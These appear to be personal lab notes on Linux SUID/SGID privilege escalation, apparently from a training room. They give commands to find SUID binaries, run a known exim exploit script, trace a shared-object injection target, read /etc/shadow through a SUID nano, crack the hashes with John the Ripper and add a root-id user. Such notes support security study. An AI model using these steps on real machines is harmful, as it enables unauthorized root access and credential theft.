SUID is a temporary permission in Linux/Unix that allows a user to run a program/file with the permissions of the file owner instead of the user who runs it.
	SUID:     4
	SGID:     2
	STICKY: 1
	
```
find / -type f -perm -04000 -ls 2>/dev/null
```

```
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```
	A good practice would to be to check GTFOBins

Known Exploits:
	If this is found under SUID/SGID search: /usr/sbin/exim-4.84-3
	/home/user/tools/suid/exim/cve-2016-1531.sh (run this script)

Shared Object Injection
	/usr/local/bin/suid-so SUID executable is vulnerable to shared object injection
	
Run strace
	strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such file"
	
Check SUID permissions on these files
	$ ls -al /etc/shadow
	$ ls -al /etc/passwd

We see the nano text editor has the SUID bit set
	$ nano /etc/shadow (will print the contents)

Copy the contents of the /etc/passwd and /etc/shadow files and unshadow them
	$ unshadow passwd.txt shadow.txt > password.txt

Crack with JohnTheRipper or create a new user with root id
	$ openssl passwd -1 -salt THM passwd1 (will generate a hash)
	copy that hash and create a new user
		hacker:hash:0:0:root:/root:/bin/bash